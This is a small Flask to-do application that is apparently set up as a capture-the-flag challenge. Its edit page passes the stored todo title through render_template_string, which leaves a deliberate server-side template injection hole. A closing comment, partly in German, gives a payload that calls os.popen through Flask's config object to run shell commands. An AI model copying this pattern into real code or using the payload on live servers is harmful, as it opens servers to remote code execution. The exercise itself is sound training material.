from flask import Flask, render_template, request, render_template_string
from flask.helpers import url_for
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import redirect

from sqlalchemy import Column, DateTime, func

app = Flask(__name__)

app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///db.sqlite"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100))
    completed = db.Column(db.Boolean)
    time_created = Column(DateTime(timezone=True), server_default=func.now())
    time_updated = Column(DateTime(timezone=True), onupdate=func.now())


@app.route("/")
def home():
    todo_list = Todo.query.all()

    #return render_template_string(template)
    return render_template("list_todo.html", todo_list=todo_list)

@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title")
    new_todo = Todo(title=title, completed=False)
    db.session.add(new_todo)
    db.session.commit()
    return redirect(url_for("home"))

@app.route("/edit/<int:todo_id>")
def edit(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    
    is_checked = ""

    if todo.completed is True:
        is_checked.join("on")
    else:
        is_checked.join("false")

    template = f"""
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

            <title>To Do App</title>
        </head>
        <body>
            <h1>To Do App</h1>

        <div class="container">
           <div>
                <h3>{todo.title}</h3>
                <div class="custom-control custom-checkbox">
                    <input type="checkbox" class="custom-control-input" id="{{todo.id}}" checked={is_checked}>
                </div>
                <h3>Created at: {todo.time_created}</h3>
                <h3>Updated at: {todo.time_updated}</h3>
            </div>
       </form>
            <div>
            <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        </body>
        </html>
    """
    return render_template_string(template)


@app.route("/update/<int:todo_id>")
def update(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    todo.completed = not todo.completed
    db.session.commit()
    return redirect(url_for("home"))

@app.route("/delete/<int:todo_id>")
def delete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    db.session.delete(todo)
    db.session.commit()
    return redirect(url_for("home"))

if __name__ == "__main__":
    db.create_all()
    app.run(debug=False)


"""
Payload bei Add als name
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

Challenge text:

Hello Boss,

as our new trainee wants to learn python he wrote his first small application.
He also deployed it already on our production server without any code review.

Not sure if we should keep it online. What do you think?

regards,

John Doe
"""


